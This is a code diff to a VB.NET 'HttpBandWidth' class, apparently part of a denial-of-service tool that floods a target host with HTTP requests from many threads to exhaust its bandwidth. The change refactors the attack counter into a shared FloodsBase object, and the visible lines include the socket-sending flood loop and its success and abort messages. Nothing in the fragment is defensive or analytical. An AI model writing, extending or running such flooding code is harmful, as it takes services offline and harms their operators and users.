@@ -12,7 +12,6 @@ Public Class HttpBandWidth
     Private Threads As Thread()
     Private Port As Integer
     Private AttackRunning As Boolean = False
-    Private attacks As Integer = 0
     Private Method As String
     Private PostDATA As String
     Private RandomFile As Boolean
@@ -49,8 +48,7 @@ Public Class HttpBandWidth
             ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            GetFloodsBase().SetMessage("Bandwidth Flood on " & HostToAttack & " finished successfully, downloading the file " & attacks.ToString & " times.")
-            attacks = 0
+            GetFloodsBase().SetMessage("Bandwidth Flood on " & HostToAttack & " finished successfully, downloading the file " & GetFloodsBase.Get_AttackCount().ToString & " times.")
             GetFloodsBase().SetEnd()
         End If
 
@@ -65,8 +63,7 @@ Public Class HttpBandWidth
                 End Try
             Next
             AttackRunning = False
-            GetFloodsBase().SetMessage("Bandwidth Flood on " & HostToAttack & " aborted successfully, downloading the file " & attacks.ToString & " times.")
-            attacks = 0
+            GetFloodsBase().SetMessage("Bandwidth Flood on " & HostToAttack & " aborted successfully, downloading the file " & GetFloodsBase.Get_AttackCount().ToString & " times.")
         Else
             GetFloodsBase().SetMessage("No Bandwidth Flood Attack is Running!")
         End If
@@ -122,8 +119,8 @@ Public Class HttpBandWidth
 
                         socketArray(i).Send(ASCIIEncoding.Default.GetBytes(headerContent.ToString), SocketFlags.None)
 
-                        attacks = attacks + 1
-                        GetFloodsBase().Set_AttackUpStrengOnByte(attacks * headerContent.Length)
+                        GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
+                        GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * headerContent.Length)
 
                     Next i
                     Dim j As Integer
@@ -137,7 +134,7 @@ Public Class HttpBandWidth
                             sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                         Loop Until bytes > 0
 
-                        GetFloodsBase().Set_AttackDownStrengOnByte(attacks * sb.ToString().Length)
+                        GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
                     Next j
                     Continue Do
                 Catch
